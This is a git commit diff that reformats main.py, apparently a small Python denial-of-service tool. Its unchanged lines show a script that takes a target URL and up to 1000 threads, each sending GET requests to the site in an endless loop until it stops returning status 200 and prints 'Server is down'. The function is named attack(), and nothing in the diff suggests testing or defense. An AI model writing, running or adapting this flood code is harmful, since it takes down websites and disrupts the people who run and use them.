d58bfaac22d92b86a7d0d2216f6e65b6afadd889
Sarrah <sarahnajatt77@gmail.com>
2025-02-15 02:38:14 +0300

    Done!

--- main.py
+++ main.py
@@ -13,39 +13,43 @@ parser.add_argument("num_of_threads",
                     nargs="?",
                     default=1000)
 
-# Parse the arguments 
+# Parse the arguments
 args = parser.parse_args()
 
 # hundle the error a case of invalid URL
 try:
-    req_to_server=requests.get(args.target_url)
+    req_to_server = requests.get(args.target_url)
 except requests.exceptions.MissingSchema:
     print("Invalid URL")
     sys.exit(0)
-    
+
 if args.num_of_threads <= 0:
     print(f"{args.num_of_threads} must be a positive number")
     sys.exit(0)
 
 threads = []
 
+
 # reqs function to send requests to the server
 def reqs():
     while True:
-       req_to_url= requests.get(args.target_url)
-      
-       if req_to_url.status_code != 200:
-           print("Server is down")
-          
-           os._exit(0)
-               
+        req_to_url = requests.get(args.target_url)
+
+        if req_to_url.status_code != 200:
+            print("Server is down")
+
+            os._exit(0)
+
+
 def attack():
     for i in range(args.num_of_threads):
         thread = threading.Thread(target=reqs)
 
         thread.start()
         threads.append(thread)
-        print(f" {i+1} number of reqs send to {args.target_url} and the status code is {req_to_server.status_code}")
+        print(
+            f" {i+1} number of reqs send to {args.target_url} and the status code is {req_to_server.status_code}"
+        )
         if i == args.num_of_threads - 1:
             print("Done!")
 
